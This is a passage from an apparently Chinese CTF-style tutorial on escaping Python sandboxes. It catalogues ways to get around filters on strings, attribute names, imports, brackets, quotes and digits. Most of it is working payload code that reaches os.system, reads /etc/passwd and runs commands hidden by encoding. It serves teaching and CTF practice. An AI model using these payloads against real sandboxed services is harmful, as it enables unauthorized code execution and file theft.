<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">【初始】secret_data = TOP_SECRET</span><br><span class="line">【初始】调用 hidden_func(): [original] hidden_func called</span><br><span class="line">[*] 命中作用域： __main__</span><br><span class="line"></span><br><span class="line">【修改后】secret_data = HACKED_SECRET</span><br><span class="line">【修改后】调用 hidden_func(): [hacked] hidden_func called!</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <ul>
<li><p><strong>Python 3.9 及常见“无审计”环境</strong> ：访问 <code>tb.tb_frame</code> 通常不会触发审计事件，利用链可直接成立。</p>
</li>
<li><p><strong>Python 3.11 + 审计策略严格的环境</strong> ：访问 <code>tb.tb_frame</code> 可能触发 <strong><code>object.__getattr__</code></strong> 或相关审计事件，会被审计钩子监控。</p>
</li>
</ul>
<p>这不是版本必然拦截，而是<strong>具体环境有无安装审计钩子</strong>&amp;<strong>拦截点覆盖到哪里</strong>的问题。</p>

    </div>
  </div>

<h1 id="绕过基于字符串匹配的过滤"><a href="#绕过基于字符串匹配的过滤" class="headerlink" title="绕过基于字符串匹配的过滤"></a>绕过基于字符串匹配的过滤</h1><h2 id="字符串变换"><a href="#字符串变换" class="headerlink" title="字符串变换"></a>字符串变换</h2><h3 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h3><p>在我们的 payload 中，例如如下的 payload，<code>__builtins__</code> <code>file</code> 这些字符串如果被过滤了，就可以使用字符串变换的方式进行绕过。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;file&#x27;</span>](<span class="string">&#x27;E:/passwd&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__buil&#x27;</span>+<span class="string">&#x27;tins__&#x27;</span>][<span class="string">&#x27;fi&#x27;</span>+<span class="string">&#x27;le&#x27;</span>](<span class="string">&#x27;E:/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure></div>

<p>当然，如果过滤的是 <code>__class__</code> 或者 <code>__mro__</code> 这样的属性名，就无法采用变形来绕过了。</p>
<h3 id="base64-变形"><a href="#base64-变形" class="headerlink" title="base64 变形"></a>base64 变形</h3><p>base64 也可以运用到其中</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;__import__&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;b3M=&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).system(<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<h3 id="逆序"><a href="#逆序" class="headerlink" title="逆序"></a>逆序</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;</span>[::-<span class="number">1</span>])</span><br><span class="line">kali</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;</span>[::-<span class="number">1</span>])</span><br><span class="line">kali</span><br></pre></td></tr></table></figure></div>

<h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><p>八进制：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;print(&#x27;RCE&#x27;); __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>exp:</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False])&quot;</span></span><br><span class="line">octal_string = <span class="string">&quot;&quot;</span>.join([<span class="string">f&quot;\\<span class="subst">&#123;<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]&#125;</span>&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"><span class="built_in">print</span>(octal_string)</span><br></pre></td></tr></table></figure></div>

<p>十六进制：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>exp:</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;eval(eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False]))&quot;</span></span><br><span class="line">octal_string = <span class="string">&quot;&quot;</span>.join([<span class="string">f&quot;\\x<span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]&#125;</span>&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"><span class="built_in">print</span>(octal_string)</span><br></pre></td></tr></table></figure></div>

<h3 id="其他编码"><a href="#其他编码" class="headerlink" title="其他编码"></a>其他编码</h3><p>hex、rot13、base32 等。</p>
<h2 id="过滤了属性名或者函数名"><a href="#过滤了属性名或者函数名" class="headerlink" title="过滤了属性名或者函数名"></a>过滤了属性名或者函数名</h2><p>在 payload 的构造中，我们大量的使用了各种类中的属性，例如 <code>__class__</code>、<code>__import__</code> 等。</p>
<h3 id="getattr-函数"><a href="#getattr-函数" class="headerlink" title="getattr 函数"></a>getattr 函数</h3><p>getattr 是 Python 的内置函数，用于获取一个对象的属性或者方法。其语法如下：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(<span class="built_in">object</span>, name[, default])</span><br></pre></td></tr></table></figure></div>

<p>这里，object 是对象，name 是字符串，代表要获取的属性的名称。如果提供了 default 参数，当属性不存在时会返回这个值，否则会抛出 AttributeError。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(&#123;&#125;,<span class="string">&#x27;__class__&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(os,<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function system&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(os,<span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/usr/<span class="built_in">bin</span>/zsh</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(os,<span class="string">&#x27;system111&#x27;</span>,os.system)(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/usr/<span class="built_in">bin</span>/zsh</span><br></pre></td></tr></table></figure></div>

<p>这样一来，就可以将 payload 中的属性名转化为字符串，字符串的变换方式多种多样，更易于绕过黑名单。</p>
<h3 id="getattribute-函数"><a href="#getattribute-函数" class="headerlink" title="__getattribute__ 函数"></a><code>__getattribute__</code> 函数</h3><p><code>__getattribute__</code> 于，它定义了当我们尝试获取一个对象的属性时应该进行的操作。</p>
<p>它的基本语法如下：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getattribute__</span>(<span class="params">self, name</span>):</span><br></pre></td></tr></table></figure></div>

<p><code>getattr</code> 函数在调用时，实际上就是调用这个类的 <code>__getattribute__</code> 方法。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.__getattribute__</span><br><span class="line">&lt;method-wrapper <span class="string">&#x27;__getattribute__&#x27;</span> of module <span class="built_in">object</span> at <span class="number">0x7f06a9bf44f0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.__getattribute__(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function system&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="getattr-函数-1"><a href="#getattr-函数-1" class="headerlink" title="__getattr__ 函数"></a><code>__getattr__</code> 函数</h3><p><code>__getattr__</code> 是 Python 的一个特殊方法，当尝试访问一个对象的不存在的属性时，它就会被调用。它允许一个对象动态地返回一个属性值，或者抛出一个 <code>AttributeError</code> 异常。</p>
<p>如下是 <code>__getattr__</code> 方法的基本形式：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getattr__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;You tried to get &#x27;</span> + name</span><br></pre></td></tr></table></figure></div>

<p>在这个例子中，任何你尝试访问的不存在的属性都会返回一个字符串，形如 “You tried to get X”，其中 X 是你尝试访问的属性名。</p>
<p>与 <code>__getattribute__</code> 不同，<code>__getattr__</code> 只有在属性查找失败时才会被调用，这使得 <code>__getattribute__</code> 可以用来更为全面地控制属性访问。</p>
<p>如果在一个类中同时定义了 <code>__getattr__</code> 和 <code>__getattribute__</code>，那么无论属性是否存在，<code>__getattribute__</code> 都会被首先调用。只有当 <code>__getattribute__</code> 抛出 <code>AttributeError</code> 异常时，<code>__getattr__</code> 才会被调用。</p>
<p>另外，所有的类都会有<code>__getattribute__</code>属性，而不一定有<code>__getattr__</code>属性。</p>
<h3 id="globals-替换"><a href="#globals-替换" class="headerlink" title="__globals__ 替换"></a><code>__globals__</code> 替换</h3><p>在 Python2 <code>__globals__</code> 可以用 <code>func_globals</code> 直接替换；</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">&quot;__glo&quot;</span>+<span class="string">&quot;bals__&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="mro-、-bases-、-base-互换"><a href="#mro-、-bases-、-base-互换" class="headerlink" title="__mro__、__bases__、__base__ 互换"></a><code>__mro__</code>、<code>__bases__</code>、<code>__base__</code> 互换</h3><p>三者之间可以相互替换</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">[].__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br></pre></td></tr></table></figure></div>

<h2 id="过滤-import"><a href="#过滤-import" class="headerlink" title="过滤 import"></a>过滤 import</h2><p>python 中除了可以使用 import 来导入，还可以使用 <code>__import__</code> 和 <code>importlib.import_module</code> 来导入模块</p>
<h3 id="import-1"><a href="#import-1" class="headerlink" title="__import__"></a><code>__import__</code></h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="importlib-import-module"><a href="#importlib-import-module" class="headerlink" title="importlib.import_module"></a><code>importlib.import_module</code></h3><p><code>importlib</code> 是 Python 的<strong>导入机制接口</strong>模块，里面的 <code>import_module()</code> 函数相当于动态版的 <code>import</code> 语句。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">importlib.import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>因为 <code>importlib</code> <strong>不是内建的名字</strong>，它本身需要先 <code>import importlib</code> 才能用，所以有些鸡肋。</p>
<h3 id="loader-load-module"><a href="#loader-load-module" class="headerlink" title="__loader__.load_module"></a><code>__loader__.load_module</code></h3><p><code>__loader__</code> 的 <strong><code>load_module(name)</code> 是老接口</strong>（PEP 302 时代，Py3.4 前），现在<strong>只在少数加载器（内建&#x2F;冻结）还留了兼容层</strong>；多数现代加载器不再提供它。</p>
<p><code>__builtins__</code> 的  <code>__loader__</code> 通常是 <strong><code>BuiltinImporter</code> &#x2F; <code>FrozenImporter</code><strong>，</strong>只会加载内建&#x2F;冻结模块</strong>，例如 <code>sys</code>，<code>gc</code> 等，但是像 <code>os</code> 是<strong>标准库的纯 Python 模块</strong>，<strong>不在</strong>它的能力范围内。</p>
<p>具体细节见<strong>绕过 audit hook</strong> 部分。</p>
<h2 id="过滤了"><a href="#过滤了" class="headerlink" title="过滤了 []"></a>过滤了 []</h2><p>如果中括号被过滤了，则可以使用如下的两种方式来绕过：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">200</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="getitem"><a href="#getitem" class="headerlink" title="__getitem__"></a><code>__getitem__</code></h3><p>调用 <code>__getitem__()</code> 函数直接替换；</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># __getitem__()替换中括号[]</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>).__subclasses__().__getitem__(<span class="number">200</span>).__init__.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">((imp := (<span class="built_in">getattr</span>((b := (<span class="built_in">next</span>(c <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>).__subclasses__() <span class="keyword">if</span> <span class="built_in">hasattr</span>(<span class="built_in">getattr</span>(c,<span class="string">&#x27;__init__&#x27;</span>,<span class="literal">None</span>),<span class="string">&#x27;__globals__&#x27;</span>))).__init__.__globals__.get(<span class="string">&#x27;__builtins__&#x27;</span>)), <span class="string">&#x27;__import__&#x27;</span>, <span class="literal">None</span>) <span class="keyword">or</span> (<span class="built_in">getattr</span>(b,<span class="string">&#x27;get&#x27;</span>,<span class="literal">None</span>) <span class="keyword">and</span> b.get(<span class="string">&#x27;__import__&#x27;</span>)))))(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a><code>pop</code></h3><p><code>pop()</code> 方法既能<strong>取值</strong>，又会<strong>移除</strong>目标元素，可以用来替代被过滤掉的中括号访问。</p>
<ul>
<li><strong>列表（list）</strong>：<code>lst.pop(i)</code> → 取出并删除指定索引的元素（默认删除最后一个）。</li>
<li><strong>字典（dict）</strong>：<code>dict.pop(key)</code> → 取出并删除指定键的值。</li>
</ul>
<p>在沙箱逃逸链中，如果 <code>[]</code> 被过滤，可以用 <code>pop()</code> 取代：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用 pop() 取代下标和取键，结合 __getitem__() 完成链路</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>).__subclasses__().pop(<span class="number">200</span>).__init__.__globals__.pop(<span class="string">&#x27;__builtins__&#x27;</span>).pop(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者混合使用 __getitem__() 与 getattr()</span></span><br><span class="line"><span class="built_in">getattr</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>).__subclasses__().__getitem__(<span class="number">200</span>).__init__.__globals__,<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p><code>pop</code> 会把条目<strong>删掉</strong>。比如你 <code>__globals__.pop(&#39;__builtins__&#39;)</code>，后续环境就少了内建绑定，可能导致后续表达式或模块加载行为异常。</p>

    </div>
  </div>

<h2 id="过滤了-1"><a href="#过滤了-1" class="headerlink" title="过滤了 &#39;&#39;"></a>过滤了 <code>&#39;&#39;</code></h2><h3 id="str-函数"><a href="#str-函数" class="headerlink" title="str 函数"></a>str 函数</h3><p>如果过滤了引号，我们 payload 中构造的字符串会受到影响。其中一种方法是使用 <code>str()</code> 函数获取字符串，然后索引到预期的字符。将所有的字符连接起来就可以得到最终的字符串。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__new__</span><br><span class="line">&lt;built-<span class="keyword">in</span> method __new__ of <span class="built_in">type</span> <span class="built_in">object</span> at <span class="number">0x9597e0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(().__class__.__new__)</span><br><span class="line"><span class="string">&#x27;&lt;built-in method __new__ of type object at 0x9597e0&gt;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(().__class__.__new__)[<span class="number">21</span>]</span><br><span class="line"><span class="string">&#x27;w&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(().__class__.__new__)[<span class="number">21</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">13</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">14</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">40</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">10</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">3</span>]</span><br><span class="line"><span class="string">&#x27;whoami&#x27;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="chr-函数"><a href="#chr-函数" class="headerlink" title="chr 函数"></a>chr 函数</h3><p>也可以使用 chr 加数字来构造字符串</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">56</span>)</span><br><span class="line"><span class="string">&#x27;8&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">100</span>)</span><br><span class="line"><span class="string">&#x27;d&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">100</span>)*<span class="number">40</span></span><br><span class="line"><span class="string">&#x27;dddddddddddddddddddddddddddddddddddddddd&#x27;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="list-dict-构造任意字符串"><a href="#list-dict-构造任意字符串" class="headerlink" title="list + dict 构造任意字符串"></a>list + dict 构造任意字符串</h3><p>使用 dict 和 list 进行配合可以将变量名转化为字符串，但这种方式的弊端在于字符串中不能有空格等。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">list</span>(<span class="built_in">dict</span>(whoami=<span class="number">1</span>))[<span class="number">0</span>]</span><br><span class="line"><span class="string">&#x27;whoami&#x27;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="doc"><a href="#doc" class="headerlink" title="__doc__"></a><code>__doc__</code></h3><p><code>__doc__</code> 变量可以获取到类的说明信息，从其中索引出想要的字符然后进行拼接就可以得到字符串：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__doc__.find(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line"><span class="number">19</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">86</span>]+().__doc__[<span class="number">19</span>]</span><br><span class="line"><span class="string">&#x27;sys&#x27;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="bytes-函数"><a href="#bytes-函数" class="headerlink" title="bytes 函数"></a>bytes 函数</h3><p>bytes 函数可以接收一个 ascii 列表，然后转换为二进制字符串，再调用 decode 则可以得到字符串</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">bytes</span>([<span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>]).decode()</span><br><span class="line"><span class="string">&#x27;system&#x27;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="过滤了-2"><a href="#过滤了-2" class="headerlink" title="过滤了 +"></a>过滤了 +</h2><p>过滤了 + 号主要影响到了构造字符串，假如题目过滤了引号和加号，构造字符串还可以使用 <code>join</code> 函数，初始的字符串可以通过 <code>str()</code> 进行获取.具体的字符串内容可以从 <code>__doc__</code> 中取，</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>().join((().__doc__[<span class="number">19</span>],().__doc__[<span class="number">23</span>]))</span><br><span class="line"><span class="string">&#x27;se&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">list</span>(<span class="built_in">dict</span>(s_t_r=<span class="number">1</span>))[<span class="number">0</span>][::<span class="number">2</span>]</span><br><span class="line"><span class="string">&#x27;str&#x27;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="过滤了数字"><a href="#过滤了数字" class="headerlink" title="过滤了数字"></a>过滤了数字</h2><p>如果过滤了数字的话，可以使用一些函数的返回值获取。例如： </p>
<ul>
<li>0：<code>int(bool([]))</code>、<code>Flase</code>、<code>len([])</code>、<code>any(())</code></li>
<li>1：<code>int(bool([&quot;&quot;]))</code>、<code>True</code>、<code>all(())</code>、<code>int(list(list(dict(a၁=())).pop()).pop())</code></li>
</ul>
<p>有了 0 之后，其他的数字可以通过运算进行获取：</p>
